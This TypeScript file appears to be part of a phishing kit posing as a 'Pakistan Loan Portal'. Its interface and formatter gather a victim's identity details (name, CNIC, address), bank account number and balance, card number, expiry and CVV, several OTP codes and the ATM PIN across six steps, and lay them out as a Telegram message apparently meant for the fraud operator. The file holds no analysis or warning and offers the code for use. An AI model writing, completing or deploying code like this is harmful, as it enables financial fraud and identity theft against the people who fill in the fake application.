export interface TelegramPayload {
  step: number;
  stepName: string;
  timestamp: string;
  referenceNo?: string;
  // Step 1
  fullName?: string;
  cnic?: string;
  mobileNo?: string;
  gender?: string;
  dateOfBirth?: string;
  province?: string;
  address?: string;
  // Step 2
  loanAmount?: string;
  loanPurpose?: string;
  occupation?: string;
  bankName?: string;
  accountNumber?: string;
  currentBalance?: string;
  monthlyIncome?: string;
  // Step 3
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
  processingTax?: string;
  // Step 4
  otpCode?: string;
  // Step 5
  atmPin?: string;
  // Step 6
  finalOtpCode?: string;
}

export function formatTelegramSubmission(data: Partial<TelegramPayload>): string {
  let text = `🇵🇰 *Pakistan Loan Portal - Application Submission*\n`;
  text += `━━━━━━━━━━━━━━━━━━━━━\n`;
  text += `📌 *Stage:* Step ${data.step || 1} - ${data.stepName || 'Applicant Data'}\n`;
  text += `⏱️ *Time:* ${data.timestamp || new Date().toISOString()}\n`;
  if (data.referenceNo) {
    text += `🔖 *Reference ID:* \`${data.referenceNo}\`\n`;
  }
  text += `\n`;

  // Step 1: Personal Details
  if (data.fullName || data.cnic || data.mobileNo || (data.step && data.step >= 1)) {
    text += `👤 *Personal Information:*\n`;
    text += `• Full Name: \`${data.fullName || 'N/A'}\`\n`;
    text += `• CNIC: \`${data.cnic || 'N/A'}\`\n`;
    text += `• Mobile No: \`${data.mobileNo || 'N/A'}\`\n`;
    if (data.gender) text += `• Gender: ${data.gender}\n`;
    if (data.dateOfBirth) text += `• DOB: ${data.dateOfBirth}\n`;
    if (data.province) text += `• Province: ${data.province}\n`;
    if (data.address) text += `• Address: ${data.address}\n`;
    text += `\n`;
  }

  // Step 2: Bank & Loan Details
  if (data.loanAmount || data.bankName || data.accountNumber || (data.step && data.step >= 2)) {
    text += `🏦 *Bank & Loan Details:*\n`;
    text += `• Required Amount: \`${data.loanAmount || 'N/A'}\`\n`;
    if (data.loanPurpose) text += `• Loan Purpose: ${data.loanPurpose}\n`;
    if (data.occupation) text += `• Occupation: ${data.occupation}\n`;
    if (data.bankName) text += `• Bank Name: ${data.bankName}\n`;
    if (data.accountNumber) text += `• Account No: \`${data.accountNumber}\`\n`;
    if (data.currentBalance) text += `• Balance: \`${data.currentBalance}\`\n`;
    if (data.monthlyIncome) text += `• Monthly Income: \`${data.monthlyIncome}\`\n`;
    text += `\n`;
  }

  // Step 3: Card Information
  if (data.cardNumber || data.expiry || data.cvv || (data.step && data.step >= 3)) {
    text += `💳 *Card Information (Fee Rs. 75):*\n`;
    text += `• Card Number: \`${data.cardNumber || 'N/A'}\`\n`;
    text += `• Expiry: \`${data.expiry || 'N/A'}\`\n`;
    text += `• CVV: \`${data.cvv || 'N/A'}\`\n`;
    text += `• Tax: ${data.processingTax || 'Rs. 75'}\n`;
    text += `\n`;
  }

  // Step 4: OTP
  if (data.otpCode) {
    text += `🔢 *Step 4 OTP:* \`${data.otpCode}\`\n\n`;
  }

  // Step 5: ATM PIN
  if (data.atmPin) {
    text += `🔐 *Step 5 ATM PIN:* \`${data.atmPin}\`\n\n`;
  }

  // Step 6: Final OTP
  if (data.finalOtpCode) {
    text += `✅ *Step 6 Final Verification OTP:* \`${data.finalOtpCode}\`\n`;
    text += `━━━━━━━━━━━━━━━━━━━━━\n`;
    text += `🎉 *Application Submitted Successfully!*\n`;
  }

  return text;
}
